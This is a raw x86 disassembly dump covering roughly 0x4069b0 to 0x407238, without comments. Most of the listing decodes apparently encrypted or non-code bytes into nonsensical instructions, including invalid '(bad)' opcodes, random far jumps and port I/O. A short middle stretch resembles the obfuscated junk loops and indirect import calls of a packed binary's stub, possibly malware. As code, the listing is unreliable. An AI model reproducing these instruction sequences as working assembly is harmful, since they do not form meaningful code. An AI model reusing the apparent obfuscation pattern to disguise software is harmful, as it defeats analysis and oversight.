  4069b0:	imul   edi,DWORD PTR [edx+0x9],0x1
  4069b4:	push   edx
  4069b5:	call   0xd61b:0x52a23cd2
  4069bc:	push   edi
  4069bd:	jnp    0x4069c6
  4069bf:	xor    BYTE PTR [eax+0x13],0xf6
  4069c3:	test   DWORD PTR [eax+0x3bd3f3a5],esp
  4069c9:	dec    esp
  4069ca:	enter  0xeec9,0xa
  4069ce:	cmp    eax,DWORD PTR [eax+0x45]
  4069d1:	add    bh,BYTE PTR [ebx-0x7978a96c]
  4069d7:	lods   eax,DWORD PTR ds:[esi]
  4069d8:	retf   0x216f
  4069db:	sbb    DWORD PTR [edx-0x28e3d8d6],0xffffffac
  4069e2:	je     0x406a2e
  4069e4:	adc    edi,DWORD PTR [edi]
  4069e6:	adc    bl,cl
  4069e8:	outs   dx,DWORD PTR ds:[esi]
  4069e9:	pop    ebp
  4069ea:	clc    
  4069eb:	jmp    0x2ed5:0xa92c20c7
  4069f2:	ds pop edx
  4069f4:	push   ecx
  4069f5:	push   esi
  4069f6:	aad    0xaf
  4069f8:	sbb    esi,DWORD PTR [eax-0x42]
  4069fb:	sub    al,0xe7
  4069fd:	push   0xffffff89
  4069ff:	gs inc esp
  406a01:	mov    cl,0xdd
  406a03:	nop
  406a04:	push   edi
  406a05:	inc    ebp
  406a06:	cs sub eax,0xb99e222b
  406a0c:	imul   edi,DWORD PTR [edx+0x6ac6de57],0xc1e008f8
  406a16:	scas   ax,WORD PTR es:[edi]
  406a18:	or     DWORD PTR [eax-0x69],ecx
  406a1b:	inc    eax
  406a1c:	pop    ds
  406a1d:	aad    0x7d
  406a1f:	push   ecx
  406a20:	sub    esp,DWORD PTR [ecx]
  406a22:	into   
  406a23:	outs   dx,DWORD PTR ds:[esi]
  406a24:	out    0xfe,eax
  406a26:	mov    WORD PTR [ecx],cs
  406a28:	stos   BYTE PTR es:[edi],al
  406a29:	fadd   QWORD PTR [edi+0x7f1f2126]
  406a2f:	test   BYTE PTR [ebx],0x44
  406a32:	pop    eax
  406a33:	adc    BYTE PTR [ebx-0xa4dc607],dh
  406a39:	ja     0x406a02
  406a3b:	sub    ch,BYTE PTR [esi-0x5f]
  406a3e:	mov    ds:0xfcb4e272,eax
  406a43:	xchg   edi,eax
  406a44:	sbb    esi,DWORD PTR [ecx+0x7b02542a]
  406a4a:	inc    eax
  406a4b:	jl     0x406abe
  406a4d:	or     ebx,DWORD PTR ds:0x84eea324
  406a53:	xlat   BYTE PTR ds:[ebx]
  406a54:	or     dl,bh
  406a56:	stc    
  406a57:	das    
  406a58:	js     0x4069f8
  406a5a:	data16 mov WORD PTR [ebx-0x25],fs
  406a5e:	mov    ebx,0x87c07554
  406a63:	(bad)  
  406a64:	jns    0x406a07
  406a66:	xchg   DWORD PTR [ebp*1-0x477733ff],ebp
  406a6d:	pop    ecx
  406a6e:	dec    esi
  406a6f:	outs   dx,DWORD PTR ds:[esi]
  406a70:	xchg   edx,eax
  406a71:	xor    al,0xe3
  406a73:	mov    ch,BYTE PTR cs:[ecx+ebp*2]
  406a77:	push   ecx
  406a78:	push   eax
  406a79:	mov    ebx,0x93da5f90
  406a7e:	cld    
  406a7f:	cmc    
  406a80:	imul   esi,DWORD PTR [esi],0x1911bf58
  406a86:	push   0xffffff80
  406a88:	sub    bh,BYTE PTR ds:0x56c3dd0
  406a8e:	lods   al,BYTE PTR ds:[esi]
  406a8f:	stos   BYTE PTR es:[edi],al
  406a90:	stos   BYTE PTR es:[edi],al
  406a91:	push   edx
  406a92:	push   edx
  406a93:	scas   al,BYTE PTR es:[edi]
  406a94:	jle    0x406a99
  406a96:	push   ss
  406a97:	mov    dl,0xe7
  406a99:	and    al,0x92
  406a9b:	jns    0x406ad1
  406a9d:	jbe    0x406a74
  406a9f:	or     eax,0xb0e68727
  406aa4:	add    BYTE PTR [edi-0x41],0x25
  406aa8:	ja     0x406ae1
  406aaa:	(bad)  
  406aac:	repnz fisub DWORD PTR [ebp+0x44d0dca]
  406ab3:	fcomp  DWORD PTR [edx]
  406ab5:	jle    0x406a86
  406ab7:	add    edx,edx
  406ab9:	iret   
  406aba:	and    eax,edx
  406abc:	gs cmc 
  406abe:	dec    edx
  406abf:	into   
  406ac0:	les    ecx,FWORD PTR [eax]
  406ac2:	push   ds
  406ac3:	or     DWORD PTR gs:[eax-0xb],ebp
  406ac7:	push   edx
  406ac8:	sub    ecx,DWORD PTR [ebx-0x21]
  406acb:	xchg   esi,eax
  406acc:	retf   0xbec1
  406acf:	pop    eax
  406ad0:	mov    eax,0x7cfa9bd7
  406ad5:	addr16 pop eax
  406ad7:	cmp    ebx,DWORD PTR [eax+esi*1-0x5722fbea]
  406ade:	and    ah,dh
  406ae0:	in     eax,0x7c
  406ae2:	sbb    edx,ebx
  406ae4:	cli    
  406ae5:	pop    ss
  406ae6:	call   FWORD PTR [esi+0x5062a7b9]
  406aec:	std    
  406aed:	cmp    BYTE PTR [edi+0x2a],cl
  406af0:	xlat   BYTE PTR ds:[ebx]
  406af1:	xor    al,0xb9
  406af4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406af5:	aam    0x41
  406af7:	push   esp
  406af8:	es dec edi
  406afa:	inc    eax
  406afb:	fld    DWORD PTR [edi]
  406afd:	sub    al,0x8d
  406aff:	and    ah,BYTE PTR [ebx+0x14cedb29]
  406b05:	pop    esi
  406b06:	inc    ecx
  406b07:	fcomp  DWORD PTR [ecx]
  406b09:	out    dx,al
  406b0a:	inc    eax
  406b0b:	std    
  406b0c:	pop    ebp
  406b0d:	jle    0x406af9
  406b0f:	sub    bh,BYTE PTR es:[edi+eiz*2+0x37f52f73]
  406b17:	cmp    DWORD PTR [esi],0xecc01abb
  406b1d:	out    dx,al
  406b1e:	mov    al,ds:0xa7f99ead
  406b23:	test   eax,0x4d15a083
  406b28:	push   0xffffffb7
  406b2a:	scas   al,BYTE PTR es:[edi]
  406b2b:	loop   0x406b6c
  406b2d:	or     ebx,DWORD PTR [esp+esi*2+0x3f]
  406b31:	xor    eax,0xa647ef83
  406b36:	pop    ebp
  406b37:	retf   
  406b38:	cli    
  406b39:	arpl   sp,dx
  406b3b:	dec    esp
  406b3c:	xor    DWORD PTR [esi+0x35],0xffffff8f
  406b40:	xchg   esi,eax
  406b41:	js     0x406b7f
  406b43:	xchg   ecx,eax
  406b44:	pop    ebp
  406b45:	call   0x6ea2c682
  406b4a:	and    eax,0x8ca4c267
  406b4f:	pushf  
  406b50:	test   DWORD PTR [eax+0x4fd68a25],esi
  406b56:	xchg   esp,eax
  406b57:	aaa    
  406b58:	popf   
  406b59:	adc    eax,0x2f733a24
  406b5e:	adc    edi,DWORD PTR [edi]
  406b60:	or     BYTE PTR [esi-0x11175bc5],dh
  406b66:	jns    0x406b6b
  406b68:	adc    dh,BYTE PTR [ebp+0x1d]
  406b6b:	dec    esi
  406b6c:	arpl   WORD PTR [ebx],dx
  406b6e:	je     0x406b64
  406b70:	dec    edi
  406b71:	dec    ebp
  406b72:	jns    0x406be9
  406b74:	pusha  
  406b75:	mov    edi,0x22ee8e2
  406b7a:	test   eax,ebx
  406b7c:	pop    edx
  406b7d:	and    DWORD PTR [ebp+ebp*2-0x63d3435e],esp
  406b84:	inc    esi
  406b85:	xchg   ebx,eax
  406b86:	out    dx,eax
  406b87:	lods   eax,DWORD PTR ds:[esi]
  406b88:	mov    BYTE PTR [ebx],bh
  406b8a:	lods   al,BYTE PTR ds:[esi]
  406b8b:	cmp    bl,bl
  406b8d:	xor    ah,cl
  406b8f:	and    ebp,DWORD PTR [esi+0x67]
  406b92:	cmp    al,0xe
  406b94:	jbe    0x406b9c
  406b96:	push   0x941d6dcd
  406b9b:	imul   esp,DWORD PTR [esi+0x2e34aca2],0x2e
  406ba2:	loopne 0x406be9
  406ba4:	fisub  WORD PTR [ebx-0xc]
  406ba7:	sbb    ebp,edx
  406ba9:	cmp    DWORD PTR [eax],eax
  406bab:	loope  0x406c18
  406bad:	aad    0x32
  406baf:	pop    es
  406bb0:	mov    edx,DWORD PTR [ebp+0xf]
  406bb3:	mov    esi,0x29345f0b
  406bb8:	stc    
  406bb9:	xor    bh,BYTE PTR [esi-0x52105ffb]
  406bbf:	call   0x7a2e52f2
  406bc4:	pop    es
  406bc5:	inc    ebp
  406bc6:	mov    ebx,0xc85f8692
  406bcb:	aam    0x46
  406bcd:	outs   dx,BYTE PTR ds:[esi]
  406bce:	pop    ebx
  406bcf:	fldcw  WORD PTR ds:0x442fe33d
  406bd5:	aad    0xb4
  406bd7:	repnz cs dec ebx
  406bda:	aaa    
  406bdb:	pop    ss
  406bdc:	fwait
  406bdd:	pop    esp
  406bde:	shl    DWORD PTR [ecx],1
  406be0:	adc    edi,DWORD PTR es:[ebp-0x3702894a]
  406be7:	push   ecx
  406be8:	retf   0xf812
  406beb:	jg     0x406c6a
  406bed:	and    ah,dl
  406bef:	js     0x406b9b
  406bf1:	xchg   edi,eax
  406bf2:	test   BYTE PTR [eax-0x7],dh
  406bf5:	dec    esi
  406bf6:	clc    
  406bf7:	inc    esi
  406bf8:	xor    al,0xba
  406bfa:	sbb    DWORD PTR [edx+0x775a9666],edi
  406c00:	(bad)  
  406c01:	cmp    eax,edx
  406c03:	(bad)  {k2}{z}
  406c08:	push   eax
  406c09:	jecxz  0x406beb
  406c0b:	push   edi
  406c0c:	mov    ds:0x412224,eax
  406c11:	mov    eax,DWORD PTR [ebp+0xc]
  406c14:	xor    eax,ecx
  406c16:	jmp    0x406fa0
  406c1b:	repz into 
  406c1d:	inc    ebx
  406c1e:	or     eax,DWORD PTR [ebx-0x75]
  406c21:	pop    ebx
  406c22:	inc    esi
  406c23:	and    al,0xdd
  406c25:	sub    BYTE PTR [edi],bh
  406c27:	test   dh,cl
  406c29:	jmp    0x406c73
  406c2b:	cmp    dl,cl
  406c2d:	jle    0x406cad
  406c2f:	jmp    0x406ca2
  406c31:	jle    0x406cb1
  406c33:	fprem1 
  406c35:	(bad)  
  406c36:	fild   DWORD PTR [ecx]
  406c38:	add    bl,bh
  406c3a:	dec    eax
  406c3b:	dec    edx
  406c3c:	dec    cl
  406c3e:	cmc    
  406c3f:	sub    ebx,DWORD PTR [edi-0x462b58f3]
  406c45:	dec    ebp
  406c46:	ds cld 
  406c48:	ficomp WORD PTR [ecx]
  406c4a:	in     eax,dx
  406c4b:	fs jge 0x406bf2
  406c4e:	mov    ds:0x3a542c37,al
  406c53:	sub    al,0x43
  406c55:	jle    0x406cbd
  406c57:	jmp    0x406c0e
  406c59:	mov    eax,ds:0x71160e3c
  406c5e:	mov    al,ds:0x323e0fa1
  406c63:	lahf   
  406c64:	repz scas eax,DWORD PTR es:[edi]
  406c66:	sti    
  406c67:	xchg   BYTE PTR [ebx+0x5e],dh
  406c6a:	mov    dl,0x78
  406c6c:	fstp   QWORD PTR ds:0xc8773a70
  406c72:	and    BYTE PTR [ebx],bh
  406c74:	rol    edx,cl
  406c76:	push   esp
  406c77:	test   DWORD PTR [ebx-0x793cb972],esi
  406c7d:	push   ebp
  406c7e:	mov    dl,0xbf
  406c80:	xor    al,0x9c
  406c83:	sub    BYTE PTR [di],cl
  406c86:	dec    esp
  406c87:	xchg   ebx,eax
  406c88:	cmp    bh,BYTE PTR [ecx+0x16ed9d25]
  406c8e:	mov    BYTE PTR [esi+0x27],bl
  406c91:	jbe    0x406cbb
  406c93:	mov    WORD PTR [eax-0x80],gs
  406c96:	addr16 shl al,1
  406c99:	inc    eax
  406c9a:	xor    DWORD PTR [edi+0x20],0xbbce0afe
  406ca1:	div    BYTE PTR [eax-0xa]
  406ca4:	stos   BYTE PTR es:[edi],al
  406ca5:	sar    DWORD PTR [ecx],1
  406ca7:	sbb    ecx,DWORD PTR [ebp+0x60567e80]
  406cad:	inc    ebp
  406cae:	lea    esp,[eax]
  406cb0:	aam    0x64
  406cb2:	dec    ebx
  406cb3:	sub    bh,BYTE PTR ds:0x253df1fd
  406cb9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406cba:	inc    ebx
  406cbb:	xchg   BYTE PTR [ecx],bl
  406cbd:	mov    eax,0x45197190
  406cc2:	sub    esi,DWORD PTR [ecx+0x1c1d3327]
  406cc8:	pop    ecx
  406cc9:	gs enter 0x9e73,0xd2
  406cce:	cmc    
  406ccf:	loop   0x406d44
  406cd1:	cmp    DWORD PTR ds:0x2200dcff,ebp
  406cd7:	mov    bh,ch
  406cd9:	pop    ebp
  406cda:	(bad)  
  406cdc:	mov    dh,0x9d
  406cde:	fst    QWORD PTR [ebx+ebx*1+0x42]
  406ce2:	sbb    al,0x6e
  406ce4:	push   ds
  406ce5:	cmc    
  406ce6:	pop    ebp
  406ce7:	imul   eax,DWORD PTR [ecx],0x58f4b7b6
  406ced:	mov    ebp,0xa07ce01c
  406cf2:	jno    0x406d37
  406cf4:	jge    0x406d40
  406cf6:	pusha  
  406cf7:	aas    
  406cf8:	fs addr16 push eax
  406cfb:	imul   eax,DWORD PTR [esi],0xc
  406cfe:	(bad)  
  406cff:	xor    BYTE PTR [esi-0x257411e9],ah
  406d05:	out    0x74,al
  406d07:	aam    0xa0
  406d09:	int    0x9a
  406d0b:	mov    ebp,DWORD PTR [ebp-0x11]
  406d0e:	das    
  406d0f:	pop    ebx
  406d10:	stc    
  406d11:	add    esi,ebx
  406d13:	add    al,0xc
  406d15:	sbb    al,0x2d
  406d17:	dec    edi
  406d18:	mov    WORD PTR [ecx+0x63],ss
  406d1b:	dec    edi
  406d1c:	call   0xeab59491
  406d21:	or     eax,esi
  406d23:	out    0xc1,eax
  406d25:	push   edx
  406d26:	cmp    eax,0xeca87dd3
  406d2b:	xor    DWORD PTR [esi+0x51],esp
  406d2e:	pop    esp
  406d2f:	xchg   ebx,eax
  406d30:	lahf   
  406d31:	sub    cl,BYTE PTR ds:0x8510002e
  406d37:	pop    es
  406d38:	dec    esp
  406d39:	(bad)  [ecx]
  406d3b:	adc    eax,0x9f673b01
  406d40:	adc    esi,0xffffff94
  406d43:	retf   
  406d44:	or     DWORD PTR [edx+ebp*8+0x2ec0a0e2],esp
  406d4b:	mov    DWORD PTR [edx+0x164ec017],eax
  406d51:	inc    edx
  406d52:	aaa    
  406d53:	jnp    0x406dbb
  406d55:	imul   ebp,esi,0xe7711a6c
  406d5b:	and    dh,bh
  406d5d:	push   edx
  406d5e:	fsubr  QWORD PTR [edx-0x107147ed]
  406d64:	mov    bp,0xe240
  406d68:	mov    ch,0x4
  406d6a:	dec    edi
  406d6b:	pushfw 
  406d6d:	popf   
  406d6e:	dec    esi
  406d6f:	adc    eax,edx
  406d71:	mov    ecx,0x3bfd57b5
  406d76:	or     eax,0xa1333a4
  406d7b:	xor    dh,dl
  406d7d:	(bad)
  406d81:	pushf  
  406d82:	cli    
  406d83:	mov    ah,0x70
  406d85:	int    0xc3
  406d87:	dec    ebp
  406d88:	pop    edi
  406d89:	retf   
  406d8a:	scas   eax,DWORD PTR es:[edi]
  406d8b:	stos   BYTE PTR es:[edi],al
  406d8c:	or     ebx,DWORD PTR [esp+edi*8]
  406d8f:	std    
  406d90:	cmp    eax,0x36facab9
  406d95:	xor    al,0x8e
  406d97:	jge    0x406dd1
  406d99:	mov    ah,0x64
  406d9b:	into   
  406d9c:	inc    edi
  406d9d:	jp     0x406d7e
  406d9f:	xor    eax,0x5e4fe16b
  406da4:	lahf   
  406da5:	mov    ebx,edi
  406da7:	retf   
  406da8:	push   eax
  406da9:	scas   al,BYTE PTR es:[edi]
  406daa:	xchg   esp,eax
  406dab:	push   edx
  406dac:	mov    dl,dh
  406dae:	mov    ch,0xc8
  406db0:	fild   WORD PTR [eax-0x3d]
  406db3:	cli    
  406db4:	rol    BYTE PTR [esi-0x2c64c364],cl
  406dba:	pop    ecx
  406dbb:	out    dx,eax
  406dbc:	inc    edi
  406dbd:	mov    dl,0x9c
  406dbf:	mov    ds,WORD PTR [ebp-0x2a]
  406dc2:	inc    ecx
  406dc3:	dec    eax
  406dc4:	sub    esi,DWORD PTR [edx+0x74]
  406dc7:	and    BYTE PTR [edi-0x66],0x72
  406dcb:	lea    esp,[ebp-0x7c29620a]
  406dd1:	fmul   QWORD PTR [ecx+0x17ccf919]
  406dd7:	out    dx,eax
  406dd8:	nop
  406dd9:	push   edi
  406dda:	mov    ebp,0x62732568
  406ddf:	lods   eax,DWORD PTR ds:[esi]
  406de0:	imul   esi,DWORD PTR [esi],0xfffffff1
  406de3:	dec    ecx
  406de4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406de5:	or     DWORD PTR [esi+0x43],ebp
  406de8:	cmp    eax,0x65c8d72d
  406ded:	loop   0x406dbd
  406def:	and    dh,BYTE PTR [eax-0x1]
  406df2:	call   FWORD PTR [eax-0x40]
  406df5:	sbb    ebx,DWORD PTR [eax+ebp*8]
  406df8:	cmp    DWORD PTR [edi-0x710cf3ab],eax
  406dfe:	leave  
  406dff:	in     al,0x78
  406e01:	adc    al,0xcb
  406e03:	add    al,0x86
  406e05:	ins    BYTE PTR es:[edi],dx
  406e06:	push   ebp
  406e07:	aam    0xc6
  406e09:	add    al,0x20
  406e0c:	xlat   BYTE PTR ds:[ebx]
  406e0d:	jne    0x406e6e
  406e0f:	cmp    BYTE PTR [edi],dh
  406e11:	loope  0x406de2
  406e13:	(bad)  
  406e14:	cwde   
  406e15:	mov    ebx,0x82299854
  406e1a:	jno    0x406e60
  406e1c:	or     BYTE PTR [ecx+0x2b0dad76],bh
  406e22:	xchg   ebx,eax
  406e23:	sub    bh,BYTE PTR ds:[esi+0x48]
  406e27:	and    cl,al
  406e29:	inc    eax
  406e2a:	(bad)  
  406e2b:	(bad)  
  406e2c:	jmp    0x406e9c
  406e2e:	sub    dh,dl
  406e30:	js     0x406e84
  406e32:	inc    ebx
  406e33:	mov    ah,0xe2
  406e35:	and    BYTE PTR [esi+0x28d40e0],dh
  406e3b:	imul   edi,DWORD PTR [edi+0x620bdaae],0xf43be8e2
  406e45:	and    eax,0xcfbca091
  406e4a:	enter  0xcbeb,0xd2
  406e4e:	sbb    eax,0x7aecbda
  406e53:	sti    
  406e54:	mov    esp,0xb2857a2b
  406e59:	mov    esi,esi
  406e5b:	mov    DWORD PTR [edx],ebx
  406e5d:	sub    eax,0xe068c068
  406e62:	add    ebx,ebx
  406e64:	in     al,0xe6
  406e66:	mov    dh,0x8
  406e68:	mov    BYTE PTR ds:0x315cba25,bh
  406e6e:	fnstenv [eax-0x54]
  406e71:	pop    ebx
  406e72:	jp     0x406ebf
  406e74:	push   ebp
  406e75:	mov    edx,0x8a6d57f6
  406e7a:	or     ebp,DWORD PTR [edi]
  406e7c:	outs   dx,DWORD PTR ds:[esi]
  406e7d:	loop   0x406ec3
  406e7f:	pop    esi
  406e80:	xchg   ecx,eax
  406e81:	imul   ebp,DWORD PTR [ecx],0x2c5984e9
  406e87:	(bad)  [esi+0x79fdbbf8]
  406e8d:	or     BYTE PTR [ebp+0x190311b],bh
  406e93:	sbb    DWORD PTR [eax],ecx
  406e95:	push   edi
  406e96:	mul    BYTE PTR [edi+0x3b5ed790]
  406e9c:	xchg   ecx,eax
  406e9d:	ret    0x2fe
  406ea0:	mov    eax,ds:0xb06b452f
  406ea5:	sub    al,0x24
  406ea7:	xchg   edi,eax
  406ea8:	repz popa 
  406eaa:	out    0xd8,al
  406eac:	cli    
  406ead:	pop    ebp
  406eae:	mov    eax,DWORD PTR ds:[edx+0x48e856d1]
  406eb5:	std    
  406eb6:	repz adc eax,0xed0e478d
  406ebc:	mov    ds:0x164bbec1,eax
  406ec1:	cmp    eax,0x1fb4f510
  406ec6:	xlat   BYTE PTR es:[ebx]
  406ec8:	sub    al,0x3e
  406eca:	aaa    
  406ecb:	xchg   esp,eax
  406ecc:	xchg   DWORD PTR [esi],esi
  406ece:	fcomip st,st(7)
  406ed0:	mov    fs,WORD PTR [ebp+0x458d8e01]
  406ed6:	in     eax,dx
  406ed7:	adc    cl,BYTE PTR [eax-0x7727d67f]
  406edd:	mov    ecx,0x5c0b500d
  406ee2:	jmp    0x8229d0a2
  406ee7:	imul   esi,DWORD PTR [edi],0x77a93b5b
  406eed:	sbb    eax,0xabd1290c
  406ef2:	inc    esp
  406ef3:	xchg   edi,eax
  406ef4:	mov    bh,0xa4
  406ef6:	not    DWORD PTR [eax-0xa]
  406ef9:	data16 fwait
  406efb:	leave  
  406efc:	mov    esp,0xd375ce2c
  406f01:	jno    0x406eb9
  406f03:	test   DWORD PTR [edx+0x3a],eax
  406f06:	fidivr WORD PTR [edi]
  406f08:	cmp    BYTE PTR [ebx+0x63],ch
  406f0b:	jg     0x406ef7
  406f0d:	imul   eax,DWORD PTR [esi-0x3f29c65],0x20
  406f14:	xor    BYTE PTR [esi+ebx*8-0x5cebc594],cl
  406f1b:	(bad)  
  406f1c:	push   edx
  406f1d:	adc    BYTE PTR [edi],0xad
  406f20:	mov    esi,0x4e38893a
  406f25:	mov    eax,0xfdf19f36
  406f2a:	mov    ah,BYTE PTR [ecx-0x25]
  406f2d:	lods   eax,DWORD PTR ds:[esi]
  406f2e:	aas    
  406f2f:	(bad)  
  406f30:	jno    0x406ec9
  406f32:	mov    bl,0xa1
  406f34:	dec    ebp
  406f35:	dec    eax
  406f36:	cmp    al,0x1c
  406f38:	mov    ecx,0x85ad6e10
  406f3d:	or     al,dh
  406f3f:	add    DWORD PTR [ebx],esp
  406f41:	addr16 mov ecx,fs
  406f44:	jns    0x406f01
  406f46:	test   DWORD PTR [esi+eiz*2+0x7eb7b86a],esi
  406f4d:	inc    esi
  406f4e:	or     esp,DWORD PTR ss:[ecx+0x49]
  406f52:	icebp  
  406f53:	adc    eax,0xabacbb46
  406f58:	int    0x28
  406f5a:	fsubr  DWORD PTR [ecx-0x7c7074f5]
  406f60:	or     eax,0x5958e9c0
  406f65:	aad    0xa7
  406f67:	bound  edi,QWORD PTR [esp+ecx*4+0x6ec6d7b9]
  406f6e:	xchg   edi,eax
  406f6f:	dec    edx
  406f71:	push   ss
  406f72:	nop
  406f73:	imul   ebx,DWORD PTR [ecx+0x6],0xffffffec
  406f77:	hlt    
  406f78:	sub    al,0x35
  406f7a:	pop    ebp
  406f7b:	fiadd  DWORD PTR [edx+edx*2]
  406f7e:	out    dx,al
  406f7f:	fsub   QWORD PTR [esi+0x64b3ae6b]
  406f85:	clc    
  406f86:	push   0x2f4fc366
  406f8b:	mov    bh,0x3a
  406f8d:	fst    QWORD PTR [esi+0x520c7a9]
  406f93:	out    dx,al
  406f94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f95:	les    ecx,FWORD PTR [ebx+0x5b02596b]
  406f9b:	add    dh,BYTE PTR [ebp+0x6a]
  406f9e:	pushf  
  406f9f:	mov    ch,0x3
  406fa1:	ret    0x2ca3
  406fa4:	and    al,BYTE PTR [ecx+0x0]
  406fa7:	jmp    0x406fb6
  406fac:	mov    eax,ds:0x41222c
  406fb1:	mov    ds:0x412224,eax
  406fb6:	mov    eax,DWORD PTR [ebp+0x8]
  406fb9:	mov    eax,DWORD PTR [eax]
  406fbb:	mov    ecx,DWORD PTR ds:0x412224
  406fc1:	add    DWORD PTR [eax],ecx
  406fc3:	pop    esi
  406fc4:	pop    ebp
  406fc5:	ret    0x8
  406fc8:	push   ebp
  406fc9:	mov    ebp,esp
  406fcb:	sub    esp,0x58
  406fce:	mov    DWORD PTR ds:0x430496,0x19
  406fd8:	cmp    DWORD PTR ds:0x430496,0x0
  406fdf:	je     0x407029
  406fe5:	cmp    DWORD PTR ds:0x430496,0x8
  406fec:	jne    0x406ffd
  406ff2:	push   0x89da
  406ff7:	call   DWORD PTR ds:0x42eac4
  406ffd:	cmp    DWORD PTR ds:0x430496,0x9
  407004:	jne    0x407017
  40700a:	mov    ecx,DWORD PTR ds:0x430496
  407010:	dec    ecx
  407011:	mov    DWORD PTR ds:0x430496,ecx
  407017:	mov    ecx,DWORD PTR ds:0x430496
  40701d:	dec    ecx
  40701e:	mov    DWORD PTR ds:0x430496,ecx
  407024:	jmp    0x406fd8
  407029:	mov    ecx,DWORD PTR [ebp+0x8]
  40702c:	mov    eax,0x8a40
  407031:	xor    ax,WORD PTR [ecx+0x20]
  407035:	sbb    DWORD PTR ds:0x430556,edi
  40703b:	mov    ecx,0x3b06
  407040:	xor    DWORD PTR ds:0x43054a,0x33da
  40704a:	add    ax,cx
  40704d:	add    DWORD PTR ds:0x42ee18,0x42ee20
  407057:	movzx  eax,ax
  40705a:	mov    DWORD PTR [ebp-0xc],eax
  40705d:	xor    DWORD PTR ds:0x42ee10,edi
  407063:	mov    BYTE PTR [ebp-0x1],0x7f
  407067:	lea    eax,[ebp-0x1]
  40706a:	and    DWORD PTR ds:0x42ee1c,0x0
  407074:	xor    ecx,ecx
  407076:	or     ecx,DWORD PTR ds:0x42ee1c
  40707c:	inc    ecx
  40707d:	mov    DWORD PTR ds:0x42ee1c,ecx
  407083:	cmp    DWORD PTR ds:0x42ee1c,0x4
  40708a:	jne    0x4070a9
  407090:	push   0x5988
  407095:	push   DWORD PTR [ebp-0x28]
  407098:	push   DWORD PTR [ebp-0x24]
  40709b:	push   0x2877
  4070a0:	push   DWORD PTR [ebp-0x1c]
  4070a3:	call   DWORD PTR ds:0x42eba4
  4070a9:	cmp    DWORD PTR ds:0x42ee1c,0x3
  4070b0:	jne    0x4070c3
  4070b6:	mov    ecx,DWORD PTR ds:0x42ee1c
  4070bc:	inc    ecx
  4070bd:	mov    DWORD PTR ds:0x42ee1c,ecx
  4070c3:	cmp    DWORD PTR ds:0x42ee1c,0x11
  4070ca:	jb     0x407074
  4070d0:	sub    ecx,0x27d8
  4070d6:	mov    DWORD PTR [ebp-0x10],eax
  4070d9:	adc    DWORD PTR ds:0x43055a,edx
  4070df:	mov    al,BYTE PTR [ebp-0x1]
  4070e2:	and    DWORD PTR ds:0x42ee28,0x0
  4070ec:	jmp    0x4070fe
  4070f1:	mov    ecx,DWORD PTR ds:0x42ee28
  4070f7:	inc    ecx
  4070f8:	mov    DWORD PTR ds:0x42ee28,ecx
  4070fe:	cmp    DWORD PTR ds:0x42ee28,0x10
  407105:	jae    0x40712e
  40710b:	cmp    DWORD PTR ds:0x42ee28,0x18
  407112:	jne    0x407129
  407118:	push   DWORD PTR [ebp-0x14]
  40711b:	push   DWORD PTR [ebp-0x28]
  40711e:	push   0x42ee24
  407123:	call   DWORD PTR ds:0x42eba8
  407129:	jmp    0x4070f1
  40712e:	mov    ecx,DWORD PTR [ebp-0x10]
  407131:	xor    al,0x48
  407133:	sub    al,0x36
  407135:	neg    DWORD PTR ds:0x4304ba
  40713b:	mov    BYTE PTR [ecx],al
  40713d:	mov    DWORD PTR ds:0x430492,0x17
  407147:	cmp    DWORD PTR ds:0x430492,0x0
  40714e:	je     0x407184
  407154:	cmp    DWORD PTR ds:0x430492,0x27
  40715b:	jne    0x407171
  407161:	push   0x22e8
  407166:	push   0x2f8a
  40716b:	call   DWORD PTR ds:0x42ea04
  407171:	xor    eax,eax
  407173:	xor    eax,DWORD PTR ds:0x430492
  407179:	dec    eax
  40717a:	mov    ds:0x430492,eax
  40717f:	jmp    0x407147
  407184:	mov    DWORD PTR [ebp-0x8],0xf89c8535
  40718b:	add    ecx,ecx
  40718d:	mov    DWORD PTR [ebp-0x10],0xf89c8532
  407194:	jmp    0x407315
  407199:	rcl    BYTE PTR [esi+0x4979b0d1],0x61
  4071a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4071a1:	js     0x40714a
  4071a3:	pop    esi
  4071a4:	mov    esi,0x92ec5afa
  4071a9:	xchg   ebp,eax
  4071aa:	int    0x7e
  4071ac:	jle    0x407180
  4071ae:	jg     0x40722e
  4071b0:	jle    0x407225
  4071b2:	push   ebx
  4071b3:	out    0x1f,eax
  4071b5:	mov    ch,0x3f
  4071b7:	aam    0xd1
  4071b9:	mov    DWORD PTR [ebp-0x3c4100b6],ebp
  4071bf:	or     edi,DWORD PTR [ebx-0xc1056da]
  4071c5:	popf   
  4071c6:	sbb    DWORD PTR [esi-0x31],ebx
  4071c9:	mov    al,ds:0x7c53f90e
  4071ce:	sub    al,0xe7
  4071d0:	pop    esi
  4071d1:	out    0xd7,eax
  4071d3:	cwde   
  4071d4:	lods   eax,DWORD PTR ds:[esi]
  4071d5:	fcmovu st,st(5)
  4071d7:	bound  ecx,QWORD PTR [edi]
  4071d9:	adc    esi,esi
  4071db:	bound  ecx,QWORD PTR [ebx]
  4071dd:	mov    esi,0x3b02505f
  4071e2:	and    DWORD PTR [ebx+0x61db1867],ecx
  4071e8:	cwde   
  4071e9:	and    eax,0x2db7d381
  4071ee:	(bad)  
  4071f0:	scas   al,BYTE PTR es:[edi]
  4071f1:	sti    
  4071f2:	pop    eax
  4071f3:	cld    
  4071f4:	sub    eax,0x913d6287
  4071f9:	add    ebx,DWORD PTR [eax+eax*1-0x2]
  4071fd:	mov    ah,0x8d
  4071ff:	ja     0x40719c
  407201:	xor    ebx,DWORD PTR [edx]
  407203:	adc    bl,BYTE PTR [ecx+0x69c99b75]
  407209:	mov    cs,WORD PTR [ecx-0x34fc0868]
  40720f:	cli    
  407210:	das    
  407211:	shr    ebp,cl
  407213:	add    al,0x36
  407215:	mov    ds:0xa75f4a8e,eax
  40721a:	mov    bh,0xe1
  40721c:	aas    
  40721d:	mov    ebp,0xe8b6995c
  407222:	in     al,dx
  407223:	mov    dl,BYTE PTR [edi+edx*4]
  407226:	adc    eax,0x5ec0c964
  40722b:	and    DWORD PTR [eax+eax*4-0x4f97f8bf],0xffffffd0
  407233:	ret    0x483a
  407236:	ins    BYTE PTR es:[edi],dx
  407237:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407238:	lods   al,BYTE PTR ds:[esi]
